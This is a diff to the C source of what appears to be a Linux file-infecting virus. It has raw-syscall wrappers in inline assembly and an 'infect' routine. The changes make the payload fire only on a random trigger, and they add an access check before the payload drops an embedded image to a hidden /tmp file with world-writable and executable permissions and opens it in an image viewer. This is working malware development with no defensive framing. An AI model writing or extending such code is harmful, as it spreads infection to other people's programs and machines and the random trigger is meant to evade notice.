@@ -784,7 +784,12 @@ infect:
 		}
 		
 	}
-	do_stuff();
+
+#if DAVINCI
+	int rn = get_random_number(20);
+        if (rn == LUCKY_NUMBER)
+		do_stuff();
+#endif
 }
 
 int _getuid(void)
@@ -863,6 +868,18 @@ int _fstat(long fd, void *buf)
                         "syscall" : : "g"(fd), "g"(buf));
         asm("mov %%rax, %0" : "=r"(ret));
         return (int)ret;
+}
+
+int _access(const char *path, int mode)
+{
+	long ret;
+	 __asm__ volatile(
+                 "mov %0, %%rdi\n"
+		 "mov %1, %%rsi\n"
+		 "mov $21, %%rax\n"
+                 "syscall" : : "g"(path), "g"(mode));
+	asm("mov %%rax, %0" : "=r"(ret));
+	return ret;
 }
 
 int _unlink(const char *path)
@@ -5170,9 +5187,11 @@ void do_stuff(void)
 	char *envp[] = {"XDG_RUNTIME_DIR=/run/user/1000","DISPLAY=:0.0", NULL};
         uint8_t *png_data = (uint8_t *)davinci_bytecode;
 #if DAVINCI
-        int fd = _open("/tmp/.davinci.png", O_CREAT|O_RDWR|O_TRUNC,  S_IRUSR|S_IWUSR|S_IXUSR|S_IROTH|S_IWOTH|S_IXOTH);
-        _write(fd, png_data, 123983);
-	_close(fd);
+	if (_access("/tmp/.davinci.png", F_OK) != 0) {
+        	int fd = _open("/tmp/.davinci.png", O_CREAT|O_RDWR|O_TRUNC,  S_IRUSR|S_IWUSR|S_IXUSR|S_IROTH|S_IWOTH|S_IXOTH);
+        	_write(fd, png_data, 123983);
+		_close(fd);
+	}
         int pid = _fork();
         if (pid == 0) {
                 _execve("/usr/bin/eog", argv, envp);
